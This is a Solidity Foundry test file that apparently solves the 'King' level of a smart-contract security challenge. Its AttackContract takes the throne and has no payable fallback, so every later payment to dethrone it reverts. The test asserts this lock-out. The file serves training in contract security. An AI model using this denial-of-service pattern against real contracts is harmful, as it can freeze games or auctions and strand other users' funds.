// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/09_King.sol";

contract AttackContract  {
    constructor(King target) payable {
        payable(address(target)).call{value: target.prize()}("");
    }
}

contract TestKing is Test {
    address public player = address(0xbad);
    address public bob = address(0xb0b);
    King public instance;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        vm.deal(bob, 0.001 ether);

        vm.prank(bob);
        instance = new King{value: 1}();
    }

    function testSolution() public {
        assertEq(instance._king(), address(bob));
        vm.startPrank(player);

        new AttackContract{value: player.balance}(instance);

        vm.stopPrank();

        (bool success,) = payable(address(instance)).call{value: instance.prize()}("");
        assertFalse(success);
        assertNotEq(instance._king(), address(bob));
    }
}
